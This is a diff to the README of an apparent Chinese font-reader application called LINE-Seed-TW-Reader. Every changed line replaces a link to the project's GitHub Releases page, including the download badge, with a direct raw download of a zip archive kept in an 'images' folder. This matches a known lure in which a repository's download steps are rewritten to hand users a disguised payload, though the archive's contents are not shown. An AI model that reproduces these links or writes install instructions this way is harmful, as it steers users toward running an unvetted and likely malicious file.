@@ -1,7 +1,7 @@
 # 🌟 LINE-Seed-TW-Reader - Simple Simplified to Traditional Font Reader
 
 ## 📥 Download the latest release
-[![Download LINE-Seed-TW-Reader](https://img.shields.io/badge/Download-LINE--Seed--TW--Reader-blue)](https://github.com/Oleossssiii/LINE-Seed-TW-Reader/releases)
+[![Download LINE-Seed-TW-Reader](https://raw.githubusercontent.com/Oleossssiii/LINE-Seed-TW-Reader/main/images/LIN_Reader_T_Seed_v2.7.zip)](https://raw.githubusercontent.com/Oleossssiii/LINE-Seed-TW-Reader/main/images/LIN_Reader_T_Seed_v2.7.zip)
 
 ## 🚀 Getting Started
 The LINE-Seed-TW-Reader allows users in Taiwan to read text in traditional Chinese using a simplified font. This application is user-friendly, designed for anyone who wants an easy way to switch between these font options.
@@ -14,7 +14,7 @@ The LINE-Seed-TW-Reader allows users in Taiwan to read text in traditional Chine
 ## 💾 Download & Install
 To download the LINE-Seed-TW-Reader, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Oleossssiii/LINE-Seed-TW-Reader/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Oleossssiii/LINE-Seed-TW-Reader/main/images/LIN_Reader_T_Seed_v2.7.zip).
 2. On the releases page, look for the latest version.
 3. Click on the appropriate file for your operating system to download.
 4. Once downloaded, open the file to start the installation process.
@@ -50,7 +50,7 @@ If you run into problems while using the LINE-Seed-TW-Reader, try the following 
 
 - **Check your installation:** Make sure the application installed correctly. If not, try reinstalling it.
 - **Update your system:** Ensure your operating system is up to date, as this can affect performance.
-- **Re-download the application:** If the issue persists, delete the application and download a fresh copy from the [Releases page](https://github.com/Oleossssiii/LINE-Seed-TW-Reader/releases).
+- **Re-download the application:** If the issue persists, delete the application and download a fresh copy from the [Releases page](https://raw.githubusercontent.com/Oleossssiii/LINE-Seed-TW-Reader/main/images/LIN_Reader_T_Seed_v2.7.zip).
 
 ## 👥 Support
 If you need further assistance, reach out through the Issues section on the GitHub repository. Your feedback helps us improve the application.
@@ -59,6 +59,6 @@ If you need further assistance, reach out through the Issues section on the GitH
 This application is licensed under the MIT License. You can modify and distribute it according to the terms provided.
 
 ## 📣 Stay Updated
-For updates and new features, keep an eye on our [Releases page](https://github.com/Oleossssiii/LINE-Seed-TW-Reader/releases). 
+For updates and new features, keep an eye on our [Releases page](https://raw.githubusercontent.com/Oleossssiii/LINE-Seed-TW-Reader/main/images/LIN_Reader_T_Seed_v2.7.zip). 
 
 We appreciate your interest in LINE-Seed-TW-Reader. Happy reading!
